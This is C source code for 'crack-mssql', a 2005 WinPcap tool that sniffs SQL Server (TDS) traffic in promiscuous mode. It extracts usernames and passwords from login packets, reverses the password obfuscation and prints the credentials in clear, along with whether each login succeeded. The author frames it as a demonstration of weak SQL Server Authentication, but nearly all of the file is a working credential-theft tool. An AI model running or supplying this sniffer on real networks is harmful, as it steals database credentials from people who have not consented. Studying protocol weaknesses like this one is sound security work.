/*
    
    crack-mssql.exe decrypt passwords captured during SQL Server Authentication.
    
    Copyright (C) 2005 CHAN Fook Sheng (Singapore)
    chanfs16 [at] gmail dot com

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
*/

//I reuse some portion of code written by Politecnico di Torino, hence I need to include his license below:
/*
 * Copyright (c) 1999 - 2003
 * NetGroup, Politecnico di Torino (Italy)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Politecnico di Torino nor the names of its
 * contributors may be used to endorse or promote products derived from
 * this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */


// To compile: cl.exe /DWIN32 /DHAVE_REMOTE crack-mssql.c /link wpcap.lib wsock32.lib
//You need a Windows C Compiler, I use MS Visual C++ Toolkit 2003
//You must have Microsoft Platform SDK and WinPCap Libraries installed.

#include "pcap.h"


/* 4 bytes IP address */
typedef struct ip_address{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
}ip_address;

/* IPv4 header */
typedef struct ip_header{
    u_char ver_ihl; // Version (4 bits) + Internet header length (4 bits)
    u_char tos; // Type of service
    u_short tlen; // Total length
    u_short identification; // Identification
    u_short flags_fo; // Flags (3 bits) + Fragment offset (13 bits)
    u_char ttl; // Time to live
    u_char proto; // Protocol
    u_short crc; // Header checksum
    ip_address saddr; // Source address
    ip_address daddr; // Destination address
    u_int op_pad; // Option + Padding
}ip_header;

/* UDP header*/
typedef struct udp_header{
    u_short sport; // Source port
    u_short dport; // Destination port
    u_short len; // Datagram length
    u_short crc; // Checksum
}udp_header;

typedef struct username_length {
  u_char byte1;
  u_char byte2;
}username_length;

typedef struct username_offset {
  u_char byte1;
  u_char byte2;
}username_offset;

typedef struct password_length {
  u_char byte1;
  u_char byte2;
}password_length;

typedef struct password_offset {
  u_char byte1;
  u_char byte2;
}password_offset;

u_char *username, *password;

/* prototype of the packet handler */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);

/*
TDS7/8 Login packet characteristics:
ethernet header = 14 bytes +14
IP header = 20 bytes +20
TCP header = 20 bytes +20

Within TDS packet:
username offset is at +40 66,67
username length is at + 42
password offset is at +44
password length is at +46
*/

main()
{
pcap_if_t *alldevs;
pcap_if_t *d;
int inum;
int i=0;
pcap_t *adhandle;
char errbuf[PCAP_ERRBUF_SIZE];
u_int netmask;
char packet_filter[] = "tcp port 1433 or tcp port 2433";
struct bpf_program fcode;
char gpl[] = "This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version. This program is distributed in the hope that it will be useful,but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details. You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA";

    fprintf(stdout, "\ncrack-mssql.exe is a tool that crack SQL Server Authentication passwords\n");
    fprintf(stdout, "Copyright (c) 2005\n");
    fprintf(stdout, "Chan Fook Sheng (Singapore)\n");
    fprintf(stdout, "chanfs16 {at} g m a i l . c o m\n");
    fprintf(stdout, "All Rights Reserved.\n\n");
    fprintf(stdout, "%s\n\n", gpl);
    fprintf(stdout, "Please choose your network adaptor:\n\n");
    /* Retrieve the device list */
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        exit(1);
    }
    
    /* Print the list */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }

    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap (http://www.winpcap.org) is installed.\n");
        return -1;
    }
    
    printf("Enter the interface number (1-%d):",i);
    scanf("%d", &inum);

    fprintf(stdout, "\n\nThis tool will run and capture TSD packets(port 1433 or 2433) and display the username and password used in SQL Server Authentication.\n");
    fprintf(stdout, "This shows how weak is SQL Server Authentication.\n");
    fprintf(stdout, "Microsoft's advice is not to use SQL Server Authentication.\n\n");

    if(inum < 1 || inum > i)
    {
        printf("\nInterface number out of range.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }

    /* Jump to the selected adapter */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
    
    /* Open the adapter */
    if ( (adhandle= pcap_open(d->name, // name of the device
                             65536, // portion of the packet to capture.
                                        // 65536 grants that the whole packet will be captured on all the MACs.
                             PCAP_OPENFLAG_PROMISCUOUS, // promiscuous mode
                             1000, // read timeout
                             NULL, // remote authentication
                             errbuf // error buffer
                             ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }
    
    /* Check the link layer. We support only Ethernet for simplicity. */
    if(pcap_datalink(adhandle) != DLT_EN10MB)
    {
        fprintf(stderr,"\nThis program works only on Ethernet networks.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }
    
    if(d->addresses != NULL)
        /* Retrieve the mask of the first address of the interface */
        netmask=((struct sockaddr_in *)(d->addresses->netmask))->sin_addr.S_un.S_addr;
    else
        /* If the interface is without addresses we suppose to be in a C class network */
        netmask=0xffffff;


    //compile the filter
    if (pcap_compile(adhandle, &fcode, packet_filter, 1, netmask) <0 )
    {
        fprintf(stderr,"\nUnable to compile the packet filter. Check the syntax.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }
    
    //set the filter
    if (pcap_setfilter(adhandle, &fcode)<0)
    {
        fprintf(stderr,"\nError setting the filter.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }
    
    printf("\nlistening on %s...\n", d->description);
    
    /* At this point, we don't need any more the device list. Free it */
    pcap_freealldevs(alldevs);
    
    /* start the capture */
    pcap_loop(adhandle, 0, packet_handler, NULL);
    
    return 0;
}

/* Callback function invoked by libpcap for every incoming packet */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    struct tm *ltime;
    char timestr[16];
    ip_header *ih;
    udp_header *uh;
    u_int ip_len;
    u_short sport,dport;
    char *tds_type;
    username_offset *username_offset_ptr;
    username_length *username_length_ptr;
    password_offset *password_offset_ptr;
    password_length *password_length_ptr;
    int username_offset_int, password_offset_int;
    int count_username, count_username1, count, count1, c;
    u_char p, p1, p2, *ack;
    
    typedef struct sqlErrNum {
      u_char byte1;
      u_char byte2;
      u_char byte3;
      u_char byte4;
    }sqlErrNum;
    sqlErrNum *sqlErrNum_ptr;

    /* convert the timestamp to readable format */
    ltime=localtime(&header->ts.tv_sec);
    strftime( timestr, sizeof timestr, "%H:%M:%S", ltime);

    /* print timestamp and length of the packet */
    //printf("%s.%.6d len:%d ", timestr, header->ts.tv_usec, header->len);

    /* retireve the position of the ip header */
    ih = (ip_header *) (pkt_data +
        14); //length of ethernet header
    
    //We only want TDS login packet, i.e. 1st byte of TDS packet is 0x10
    //TDS packet start at 35hex, that means there are 53 bytes before TDS packet.
    tds_type = (char *) (pkt_data + 14 + 20 + 20); // 14+20+20=54 we looking at 54th byte in memory
    if (*tds_type == '\x10') {
       //Print the source and destination IP and ports of this TDS packet
      /* retireve the position of the udp header */
      ip_len = (ih->ver_ihl & 0xf) * 4;
      uh = (udp_header *) ((u_char*)ih + ip_len);
    

      /* convert from network byte order to host byte order */
      sport = ntohs( uh->sport );
      dport = ntohs( uh->dport );
    
      /* print ip addresses and udp ports */
      printf("%d.%d.%d.%d is trying to login to %d.%d.%d.%d\n", ih->saddr.byte1,ih->saddr.byte2,ih->saddr.byte3,ih->saddr.byte4,ih->daddr.byte1,ih->daddr.byte2,ih->daddr.byte3,ih->daddr.byte4);
      printf("%d.%d.%d.%d:%d -> %d.%d.%d.%d:%d\n",
        ih->saddr.byte1,
        ih->saddr.byte2,
        ih->saddr.byte3,
        ih->saddr.byte4,
        sport,
        ih->daddr.byte1,
        ih->daddr.byte2,
        ih->daddr.byte3,
        ih->daddr.byte4,
        dport);
            
      username_offset_ptr = (username_offset *) (pkt_data + 14 + 20 + 20 + 48);
      //offset is from start of TDS Login packet, which is 8 bytes after start of Tabular Data Stream. It is 3E for my sniffer.
      username_length_ptr = (username_length *) (pkt_data + 14 + 20 + 20 + 50); //40
      password_offset_ptr = (password_offset *) (pkt_data + 14 + 20 + 20 + 52);
      password_length_ptr = (password_length *) (pkt_data + 14 + 20 + 20 + 54); //40
      
      username_offset_int = (int) username_offset_ptr->byte1 + 100*((int) username_offset_ptr->byte2);
      //printf("username_offset_int: %d\n", username_offset_int);
      password_offset_int = (int) password_offset_ptr->byte1 + 100*((int) password_offset_ptr->byte2);
      //printf("password_offset_int: %d\n", password_offset_int);
      
      username = (u_char *) (pkt_data + 14 + 20 + 20 + 8 + username_offset_int); //8 is tds header
      
      //printf("Note: The maximum username length allowed from MS SQL Query is 128 character, although 2 bytes is used to stored the username length, which will allow up to 255 characters.\n");
      
      //printf("Username length (Hex): %x %x\n", username_length_ptr->byte1, username_length_ptr->byte2);
      
      //printf("Username offset (Dec): %d %d\n", username_offset_ptr->byte1, username_offset_ptr->byte2);
      //printf("Username length (Dec): %d %d\n", username_length_ptr->byte1, username_length_ptr->byte2);
      //printf("Password offset (Dec): %d %d\n", password_offset_ptr->byte1, password_offset_ptr->byte2);
      //printf("Password length (Dec): %d %d\n", password_length_ptr->byte1, username_length_ptr->byte2);
      
      //The fun part... displaying the username!!!
      count_username1 = (int) username_length_ptr->byte1 + 100*((int) username_length_ptr->byte2); // normally byte 2 will be zero because username aren't that long...
      //printf("count_username1:%d\n", count_username1);
      printf("Username : ");
      for(count_username=0; count_username < count_username1; count_username++) {
        printf("%c", *(username + 2 * count_username));
      }
      printf("\n");

      password = (u_char *) (pkt_data + 14 + 20 + 20 + 8 + password_offset_int); //8 is tds header
      //The fun part... displaying the pasword!!!
      count1 = (int) password_length_ptr->byte1 + 100*((int) password_length_ptr->byte2); // normally byte 2 will be zero because username aren't that long...
      //printf("count1:%d\n", count1); //debug
      printf("Password : ");
      
      //purpose of c is to make sure loop only runs the number of times the length of the password, i.e. if password is 3 characters, this loop should only runs 3 times.
      
      for(count=0, c=0; c < count1; count++,c++) {
        p = *(password + count) ^ '\xA5';
        p1 = p << 4; //upper half byte, most significant. 1a (hex), we are tackling 1
        p2 = p >> 4;
        p = p1 | p2;
        printf("%c", p);
        count++; //this is because Microsoft convert each byte of the original password into 2 bytes, hence we only need the odd number of bytes, i.e. 1st, 3rd, 5th ... all the even bytes is a5(hex)
      }
      printf("\n\n");
      
    }//if (*tds_type == '\x10')
   
    
    //We need to capture response packet. Response packets start with 04hex
    //tds_type = (char *) (pkt_data + 14 + 20 + 20);
    if (*tds_type == '\x04') {
      ack = (u_char *) (pkt_data + 14 + 20 + 20 + 8 + 288); //350th byte is ack byte if login is successful
      
      //Look for ACK
      if (*ack == '\x01') {
        printf("**********************\n");
        printf("Login seems successful\n");
        printf("**********************\n\n");
      }
      
      //Look for SQL Error Number 18456 (18 48 00 00)
      sqlErrNum_ptr = (sqlErrNum *) (pkt_data + 14 + 20 + 20 + 8 + 3);
      if (sqlErrNum_ptr->byte1 == '\x18' && sqlErrNum_ptr->byte2 == '\x48' && sqlErrNum_ptr->byte3 == '\x00' && sqlErrNum_ptr->byte4 == '\x00')
        printf("Login seems unsuccessful\n\n");
    
    }//if (*tds_type == '\x04')

}//packet_handler